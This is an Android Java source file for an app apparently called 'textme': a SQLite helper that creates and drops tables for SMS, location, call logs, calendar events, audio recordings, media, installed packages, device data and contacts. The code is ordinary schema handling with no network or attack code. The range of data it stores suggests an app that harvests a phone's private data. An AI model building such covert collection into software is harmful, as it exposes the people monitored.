package com.candroid.textme;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class DatabaseHelper extends SQLiteOpenHelper {
    public static final int VERSION = 1;
    public static final String NAME = "Main.db";
    private static DatabaseHelper sInstance;

    protected static synchronized DatabaseHelper getInstance(Context context){
        if(sInstance == null){
            sInstance = new DatabaseHelper(context);
        }
        return sInstance;
    }

    public DatabaseHelper(Context context){
        super(context, NAME, null, VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL(DataContract.SmsContract.CREATE_MESSAGE_TABLE_STATEMENT);
        db.execSQL(DataContract.LocationData.CREATE_LOCATION_TABLE_STATEMENT);
        db.execSQL(DataContract.CallLogContract.CREATE_CALL_LOG_TABLE_STATEMENT);
        db.execSQL(DataContract.CalendarEventContract.CREATE_CALENDAR_EVENT_TABLE_STATEMENT);
        db.execSQL(DataContract.AudioRecordingsContract.CREATE_AUDIO_FILES_TABLE_STATEMENT);
        db.execSQL(DataContract.MediaContract.CREATE_MEDIA_TABLE_STATEMENT);
        db.execSQL(DataContract.PackagesContract.CREATE_PACKAGES_TABLE_STATEMENT);
        db.execSQL(DataContract.DeviceContract.CREATE_DEVICE_TABLE_STATEMENT);
        db.execSQL(DataContract.ContactsContract.CREATE_CONTACTS_TABLE_STATEMENT);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL(DataContract.SmsContract.DROP_MESSAGE_TABLE_STATEMENT);
        db.execSQL(DataContract.LocationData.DROP_LOCATION_TABLE_STATEMENT);
        db.execSQL(DataContract.CallLogContract.DROP_CALL_LOG_TABLE_STATEMENT);
        db.execSQL(DataContract.CalendarEventContract.DROP_CALENDAR_EVENT_TABLE_STATEMENT);
        db.execSQL(DataContract.AudioRecordingsContract.DROP_AUDIO_FILES_TABLE_STATEMENT);
        db.execSQL(DataContract.MediaContract.DROP_MEDIA_TABLE_STATEMENT);
        db.execSQL(DataContract.PackagesContract.DROP_PACKAGES_TABLE_STATEMENT);
        db.execSQL(DataContract.DeviceContract.DROP_DEVICE_TABLE_STATEMENT);
        db.execSQL(DataContract.ContactsContract.DROP_CONTACTS_TABLE_STATEMENT);
        onCreate(db);
    }

    @Override
    public void onDowngrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        super.onDowngrade(db, oldVersion, newVersion);
    }

}